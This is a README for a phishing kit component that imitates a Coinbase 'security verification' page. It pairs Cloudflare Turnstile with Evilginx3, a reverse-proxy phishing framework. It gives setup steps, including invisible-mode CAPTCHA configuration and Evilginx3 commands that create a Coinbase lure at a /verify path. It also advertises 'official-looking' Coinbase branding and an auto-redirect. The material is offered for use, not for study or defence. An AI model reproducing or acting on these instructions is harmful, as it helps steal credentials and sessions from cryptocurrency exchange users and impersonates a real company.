# Coinbase Turnstile Redirector

## Overview

Cryptocurrency exchange security verification page with Coinbase branding and Cloudflare Turnstile CAPTCHA.

## Setup Instructions

### 1. Create Cloudflare Turnstile Site

1. Visit https://dash.cloudflare.com/?to=/:account/turnstile
2. Add new site with **Invisible** mode
3. Copy the Site Key

### 2. Configure the Redirector

Edit `index.html` line 160:
```javascript
const TURNSTILE_SITEKEY = 'YOUR_SITE_KEY';
```

### 3. Set Up Evilginx3

```
lures create coinbase
lures edit 0 redirector coinbase_turnstile
lures edit 0 path /verify
lures get-url 0
```

## Features

- Coinbase blue gradient background (#0052FF)
- Official-looking logo and branding
- Crypto security messaging
- Fully responsive design
- Auto-redirect after 3 seconds

## Notes

The blue gradient background and modern design match Coinbase's current interface style for 2024/2025.

